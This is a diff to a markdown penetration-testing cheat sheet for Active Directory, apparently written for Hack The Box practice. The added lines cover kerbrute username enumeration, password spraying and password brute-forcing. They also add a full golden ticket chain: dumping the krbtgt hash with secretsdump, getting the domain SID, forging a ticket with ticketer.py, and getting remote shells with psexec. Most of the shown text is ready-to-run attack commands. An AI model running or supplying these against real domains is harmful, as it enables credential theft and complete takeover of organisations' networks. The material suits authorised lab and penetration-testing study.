@@ -8,9 +8,15 @@
 
 #### kerbrute
 
+[https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)
+
 ```bash
-kerbrute userenum --dc <IP> -d <domain.local> users.txt
-# Can verify working by placing known users in user.txt i.e. administrator, guest,
+# Enumerate valid domain usernames. Include Administrator and guest to verify working
+kerbrute userenum -d <domain.local> --dc <IP> users.txt
+# Test a single password against a list of users
+kerbrute passwordspray -d <domain.local> --dc <IP> users.txt <password-to-spray>
+# Bruteforce a single user's password from a wordlist
+kerbrute bruteuser -d <domain.local> --dc <IP> passwords.txt <username>
 ```
 
 ## Post-Compromise Enumeration
@@ -86,7 +92,7 @@ pip3 install bloodhound
 bloodhound-python
 # Command
 bloodhound-python -u <username> -p <password> -ns <IP> -d <domain.local> -c All
-# Copy json output file into Bloodhound
+# Copy json output files into Bloodhound
 python3.8 bloodhound.py -ns <IP> -d intelligence.htb -dc dc.intelligence.htb -u <username> -p <password> -c All
 # Start neo4j and upload the output to Bloodhound
 ```
@@ -184,7 +190,7 @@ $krb5tgs$23$*<Username>$<domain.local$<domain.local>/<username*>$12345...
 
 ## GPP Credentials
 
-> Must have an already compromised account to authenticate with
+> Must have an already compromised account to authenticate with or have found via anonymous access to another protocol such as SMB
 
 ### Get-GPPPassword.ps1
 
@@ -209,14 +215,21 @@ Get-GPPPassword
 After dumping the hashes, we will use the `krbtgt` user and hash that was found.
 
 ```bash
-# From Target: Get Domain SID via PowerShell cmdlet
+# Get the NT Hash for the krbtgt (From Kali)
+secretsdump.py domain.local/<username>:<password>@<IP>  # Copy NT hash for krbtgt
+# Get the Domain SID (From Kali)
+lookupsid.py domain.local/<username>:<password>@<IP>  # Copy the SID output
+# Get Domain SID via PowerShell cmdlet (From target)
 Get-ADDomain htb.local  # Look for DomainSID
-# From Kali
-python ticket.py <nt-hash> -domain-sid <DomainSID> -domain htb.local <fake-username>
+# Forge a Golden Ticket (From Kali)
+ticketer.py -nthash <nt-hash> -domain-sid <DomainSID> -domain domain.local <fake-username>
+# The ticket will be saved to file mentioned in the output
+# We can use this ticket whenever we want to access the system with psexec, First:
 export KRB5CCNAME=<fake-username>.cache
 # Then use psexec
-psexec.py htb.local/<fake-username>@<IP> -k -no-pass  # Using IP
-psexec.py htb.local/<fake-username>@<DOMAIN> -k -no-pass  # May need to user domain
+psexec.py domain.local/<fake-username>@<IP> -k -no-pass  # Using IP
+psexec.py domain.local/<fake-username>@<DOMAIN> -k -no-pass  # May need to user domain
+psexec.py domain.local/<fake-username>@<COMPUTER> -target-ip <IP> -dc-ip <IP> -no-pass -k
 # DEBUG
 ## Redo steps replaceing <fake-username> with administrator
 # Can also try wmiexec, smbexec
